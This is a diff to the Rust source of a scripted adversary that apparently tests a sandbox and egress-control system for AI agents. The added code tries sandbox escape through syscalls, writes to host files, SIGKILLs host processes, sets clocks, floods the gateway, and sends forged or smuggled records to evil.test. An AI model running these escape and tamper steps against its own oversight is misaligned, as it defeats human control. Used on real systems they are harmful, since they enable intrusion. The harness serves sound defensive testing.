@@ -1,3 +1,5 @@
+//! Scripted adversary. It is untrusted: every security claim is checked outside it.
+use crate::common::MAX_LINE_BYTES;
 use serde_json::{json, Value};
 use std::error::Error;
 use std::ffi::CString;
@@ -37,8 +39,8 @@ fn say(event: &str, value: Value) {
     let _ = std::io::stdout().flush();
 }
 
-fn errno(result: i32) -> Value {
-    if result == 0 {
+fn errno(result: i64) -> Value {
+    if result >= 0 {
         json!({"succeeded": true})
     } else {
         json!({"succeeded": false, "errno": std::io::Error::last_os_error().raw_os_error()})
@@ -70,57 +72,96 @@ fn idle() -> ! {
     }
 }
 
-fn direct_network(private_dir: &str) {
-    let targets = ["127.0.0.1:80", "1.1.1.1:443", "[::1]:80"];
+fn direct_network(probe: &Value) {
     let mut opened = 0;
-    for target in targets {
-        if let Ok(address) = target.parse::<SocketAddr>() {
-            opened += usize::from(TcpStream::connect_timeout(&address, Duration::from_millis(30)).is_ok());
+    let port = probe["sink_port"].as_u64().unwrap_or(0) as u16;
+    let targets = [SocketAddr::from(([127, 0, 0, 1], port)), SocketAddr::from(([1, 1, 1, 1], 443))];
+    for address in targets {
+        if let Ok(mut stream) = TcpStream::connect_timeout(&address, Duration::from_millis(50)) {
+            opened += 1;
+            // A forged record: right shape, but the agent cannot know the key.
+            let _ = writeln!(stream, "{}", json!({"admit":1,"write":1,"host":"allowed.test","data":"direct leaked","credential":"","mac":"00"}));
+            let _ = stream.flush();
+            thread::sleep(Duration::from_millis(20));
         }
     }
-    let sink_port = fs::read_to_string("/proc/net/tcp").map_or(0, |text| text.lines().count());
-    let host_ports: Vec<u16> = fs::read_to_string("/proc/net/tcp").unwrap_or_default().lines().skip(1).filter_map(|line| {
-        let local = line.split_whitespace().nth(1)?;
-        u16::from_str_radix(local.split(':').nth(1)?, 16).ok()
-    }).collect();
-    for port in &host_ports {
-        opened += usize::from(TcpStream::connect_timeout(&SocketAddr::from(([127, 0, 0, 1], *port)), Duration::from_millis(30))
-            .and_then(|mut stream| writeln!(stream, "host=direct leaked").map(|()| stream)).is_ok());
-    }
-    say("direct_network", json!({"opened": opened, "visible_tcp_lines": sink_port, "private_dir": private_dir}));
+    // Try to smuggle a second record through the gateway's upstream protocol.
+    let injected = Gateway::connect(probe["gateway"].as_str().unwrap_or("/gateway.sock")).map(|mut c| {
+        c.send(json!({"op":"egress","host":"allowed.test","data":"x\n{\"admit\":1,\"write\":1,\"host\":\"evil.test\",\"data\":\"smuggled\",\"mac\":\"00\"}"}))
+    });
+    say("direct_network", json!({"opened": opened, "injection_reply": injected.ok()}));
 }
 
-fn tamper(gateway: &str, private_dir: &str) {
-    let policy = Path::new(private_dir).join("policy.json");
-    let write = fs::write(&policy, "{\"allowed\":[\"evil.test\"]}").is_ok();
-    let read = fs::read_to_string(&policy).is_ok();
-    let cgroup_escape = fs::read_dir("/sys/fs/cgroup").ok().is_some_and(|_| {
-        ["/sys/fs/cgroup/cgroup.procs", "/sys/fs/cgroup/unified/cgroup.procs"].iter().any(|p| fs::write(p, "1").is_ok())
-    });
+fn tamper(gateway: &str, probe: &Value) {
+    let policy = probe["policy_path"].as_str().unwrap_or("/missing");
+    let canary = probe["canary_path"].as_str().unwrap_or("/missing");
+    let write = fs::write(policy, "{\"allowed\":[\"evil.test\"]}").is_ok();
+    let canary_write = fs::write(canary, "tampered").is_ok();
+    let cgroup_escape = ["/sys/fs/cgroup/cgroup.procs", "/sys/fs/cgroup/unified/cgroup.procs"].iter().any(|p| fs::write(p, "1").is_ok());
     let mut time = libc::timespec { tv_sec: 1, tv_nsec: 0 };
     // SAFETY: `time` is valid for the call.
-    let clock = unsafe { libc::clock_settime(libc::CLOCK_REALTIME, &time) };
-    let clock_result = errno(clock);
+    let clock = errno(unsafe { libc::clock_settime(libc::CLOCK_REALTIME, &time) } as i64);
     time.tv_sec = 1_000_000;
     // SAFETY: `time` is valid for the call.
-    let monotonic = unsafe { libc::clock_settime(libc::CLOCK_MONOTONIC, &time) };
-    let monotonic_result = errno(monotonic);
-    let source = CString::new("none").expect("static string");
-    let target = CString::new("/").expect("static string");
-    // SAFETY: strings are valid and the call has no retained pointers.
-    let remount = unsafe { libc::mount(source.as_ptr(), target.as_ptr(), std::ptr::null(), libc::MS_REMOUNT, std::ptr::null()) };
-    let remount_result = errno(remount);
+    let monotonic = errno(unsafe { libc::clock_settime(libc::CLOCK_MONOTONIC, &time) } as i64);
     let mut kills = 0_u32;
-    for pid in 2..4096 {
+    for pid in probe["host_pids"].as_array().into_iter().flatten().filter_map(Value::as_i64) {
         // SAFETY: kill does not access process memory in this process.
-        if unsafe { libc::kill(pid, libc::SIGKILL) } == 0 {
-            kills += 1;
-        }
+        kills += u32::from(unsafe { libc::kill(pid as i32, libc::SIGKILL) } == 0);
     }
     let mut client = Gateway::connect(gateway).ok();
     let renew = client.as_mut().map(|c| c.send(json!({"op":"renew","ttl_ms":100000})));
     let reset = client.as_mut().map(|c| c.send(json!({"op":"reset","counter":999,"ttl_ms":100000,"signature":"00"})));
-    say("tamper", json!({"policy_write":write,"policy_read":read,"cgroup_escape":cgroup_escape,"clock_realtime":clock_result,"clock_monotonic":monotonic_result,"remount":remount_result,"kills":kills,"renew":renew,"reset":reset}));
+    say("tamper", json!({"policy_write":write,"canary_write":canary_write,"cgroup_escape":cgroup_escape,"clock_realtime":clock,"clock_monotonic":monotonic,"kills":kills,"renew":renew,"reset":reset}));
+}
+
+fn escape_attempts(probe: &Value) {
+    let marker = probe["host_marker"].as_str().unwrap_or("/missing");
+    let drop_file = format!("{}/agent-was-here", probe["drop_dir"].as_str().unwrap_or("/missing"));
+    let host_read = fs::read(marker).is_ok();
+    let host_write = fs::write(&drop_file, "escaped").is_ok();
+    let root_write = fs::write("/planted", "x").is_ok();
+    let visible: Vec<&str> = ["/mnt/c", "/mnt/wsl", "/run/WSL", "/init", "/etc/passwd", "/sys/fs/cgroup", "/home", "/root"]
+        .into_iter().filter(|p| Path::new(p).exists()).collect();
+    // SAFETY: each probe passes plain integers or null pointers and retains nothing.
+    let results = unsafe {
+        json!({
+            "vsock": errno(libc::socket(libc::AF_VSOCK, libc::SOCK_STREAM, 0) as i64),
+            "netlink": errno(libc::socket(libc::AF_NETLINK, libc::SOCK_RAW, 0) as i64),
+            "new_user_ns": errno(libc::unshare(libc::CLONE_NEWUSER) as i64),
+            "bpf": errno(libc::syscall(libc::SYS_bpf, 0, 0, 0)),
+            "ptrace": errno(libc::ptrace(libc::PTRACE_ATTACH, 1, 0, 0)),
+            "chroot": errno({ let path = CString::new("/tmp").expect("static"); libc::chroot(path.as_ptr()) } as i64),
+            "io_uring": errno({ let mut params = [0_u8; 120]; libc::syscall(425, 1, params.as_mut_ptr()) }),
+            "clear_parent_death_signal": errno(libc::prctl(libc::PR_SET_PDEATHSIG, 0) as i64),
+            "windows_binary_exec": windows_exec(),
+        })
+    };
+    say("escape", json!({"host_read":host_read,"host_write":host_write,"root_write":root_write,"visible":visible,"syscalls":results}));
+}
+
+/// Executes a Windows PE header from memory. On WSL2 the interop handler is
+/// kernel-global, so this checks it cannot be reached from the sandbox.
+unsafe fn windows_exec() -> Value {
+    let name = CString::new("pe").expect("static");
+    let fd = libc::memfd_create(name.as_ptr(), 0);
+    if fd < 0 {
+        return errno(-1);
+    }
+    let mut image = vec![0_u8; 512];
+    image[..2].copy_from_slice(b"MZ");
+    libc::write(fd, image.as_ptr().cast(), image.len());
+    let child = libc::fork();
+    if child == 0 {
+        let empty = CString::new("").expect("static");
+        let argv = [empty.as_ptr(), std::ptr::null()];
+        libc::syscall(libc::SYS_execveat, fd, empty.as_ptr(), argv.as_ptr(), std::ptr::null::<*const libc::c_char>(), libc::AT_EMPTY_PATH);
+        libc::_exit(127);
+    }
+    let mut status = 0;
+    libc::waitpid(child, &mut status, 0);
+    // Exit 127 means execveat returned, so nothing ran.
+    json!({"succeeded": !(libc::WIFEXITED(status) && libc::WEXITSTATUS(status) == 127), "status": status})
 }
 
 fn spawn_tree() {
@@ -128,7 +169,7 @@ fn spawn_tree() {
         // SAFETY: the child only uses simple syscalls before it sleeps.
         let pid = unsafe { libc::fork() };
         if pid == 0 {
-            // SAFETY: changing session/namespace state affects only this child.
+            // SAFETY: changing session state affects only this child.
             unsafe {
                 libc::setsid();
                 libc::signal(libc::SIGTERM, libc::SIG_IGN);
@@ -136,7 +177,6 @@ fn spawn_tree() {
                 if depth % 2 == 0 && libc::fork() != 0 {
                     libc::_exit(0);
                 }
-                libc::unshare(libc::CLONE_NEWUSER);
                 loop {
                     libc::pause();
                 }
@@ -150,30 +190,59 @@ fn spawn_tree() {
 fn flood(gateway: String) {
     for _ in 0..24 {
         let gateway = gateway.clone();
-        thread::spawn(move || loop {
-            if let Ok(mut client) = Gateway::connect(&gateway) {
-                for _ in 0..512 {
-                    client.send(json!({"op":"log","text":"x".repeat(2048)}));
-                    client.send(json!({"op":"egress","host":"blocked.test","data":"flood"}));
+        thread::spawn(move || {
+            let started = std::time::Instant::now();
+            loop {
+                if let Ok(mut client) = Gateway::connect(&gateway) {
+                    for _ in 0..512 {
+                        client.send(json!({"op":"log","text":"x".repeat(2048)}));
+                        // Logs alone first, so queue overflow is the first signal.
+                        if started.elapsed() > Duration::from_millis(150) {
+                            client.send(json!({"op":"egress","host":"blocked.test","data":"flood"}));
+                        }
+                    }
                 }
             }
         });
     }
 }
 
+fn churn(gateway: &str) {
+    let mut connected = 0_u32;
+    for _ in 0..3_000 {
+        if let Ok(mut client) = Gateway::connect(gateway) {
+            connected += u32::from(client.send(json!({"op":"status"}))["error"] != "closed");
+        }
+    }
+    let oversized = Gateway::connect(gateway).map(|mut client| {
+        let _ = writeln!(client.stream, "{}", "x".repeat(MAX_LINE_BYTES as usize * 2));
+        let mut line = String::new();
+        client.reader.read_line(&mut line).unwrap_or(0)
+    });
+    let after = Gateway::connect(gateway).map(|mut c| c.send(json!({"op":"egress","host":"allowed.test","data":"after-churn"})));
+    say("churn", json!({"connected":connected,"oversized_reply_bytes":oversized.ok(),"after":after.ok()}));
+}
+
 pub fn run(args: &[String]) -> Result<(), Box<dyn Error>> {
-    let [gateway, scenario, private_dir] = args else { return Err("agent arguments are invalid".into()) };
+    let [gateway, scenario, probe] = args else { return Err("agent arguments are invalid".into()) };
+    let probe: Value = serde_json::from_str(probe)?;
+    // SAFETY: getuid has no preconditions.
     say("started", json!({"uid": unsafe { libc::getuid() }, "pid": std::process::id()}));
     match scenario.as_str() {
         "benign" => {
             let mut client = Gateway::connect(gateway)?;
             let ok = client.send(json!({"op":"egress","host":"allowed.test","data":"work","use_secret":"api_token"}));
             let secret = client.send(json!({"op":"secret","name":"api_token"}));
-            let env_has_secret = std::env::vars().any(|(_, value)| value.contains("broker-only-token"));
-            say("benign", json!({"egress":ok,"secret":secret,"env_has_secret":env_has_secret}));
+            say("benign", json!({"egress":ok,"secret":secret}));
             idle()
         }
-        "monitor_crash" | "controller_crash" | "signed_reset" | "recreate_after_kill" => egress_loop(gateway, "allowed.test", false),
+        "controller_crash" => {
+            // SAFETY: prctl with integer arguments only.
+            say("clear_parent_death_signal", errno(unsafe { libc::prctl(libc::PR_SET_PDEATHSIG, 0) } as i64));
+            egress_loop(gateway, "allowed.test", false)
+        }
+        "monitor_crash" | "signed_reset" | "reset_races_kill" | "double_reset" | "enforcer_stall" | "recreate_after_kill" | "actuator_retry" | "actuator_dead"
+        | "classifier_stall" | "clock_rollback" => egress_loop(gateway, "allowed.test", false),
         "exfil_race" => {
             for _ in 0..7 {
                 let gateway = gateway.clone();
@@ -185,7 +254,7 @@ pub fn run(args: &[String]) -> Result<(), Box<dyn Error>> {
             if let Ok(mut client) = Gateway::connect(gateway) {
                 for counter in 1..u64::MAX {
                     client.send(json!({"op":"renew","ttl_ms":100000}));
-                    let reply = client.send(json!({"op":"reset","counter":counter,"ttl_ms":100000,"signature":"00".repeat(64)}));
+                    let reply = client.send(json!({"op":"reset","counter":counter,"from_mode":"freeze","not_after_ms":u64::MAX,"ttl_ms":100000,"signature":"00".repeat(64)}));
                     if reply["error"] == "closed" {
                         break;
                     }
@@ -194,11 +263,15 @@ pub fn run(args: &[String]) -> Result<(), Box<dyn Error>> {
             thread::sleep(Duration::from_millis(1));
         },
         "agent_attacks_control" => {
-            tamper(gateway, private_dir);
+            tamper(gateway, &probe);
+            idle()
+        }
+        "sandbox_escape" => {
+            escape_attempts(&probe);
             idle()
         }
         "direct_egress" => {
-            direct_network(private_dir);
+            direct_network(&probe);
             idle()
         }
         "denied_hosts" => {
@@ -225,6 +298,10 @@ pub fn run(args: &[String]) -> Result<(), Box<dyn Error>> {
         }
         "gateway_flood" => {
             flood(gateway.clone());
+            idle()
+        }
+        "gateway_churn" => {
+            churn(gateway);
             idle()
         }
         "classifier_injection" => {
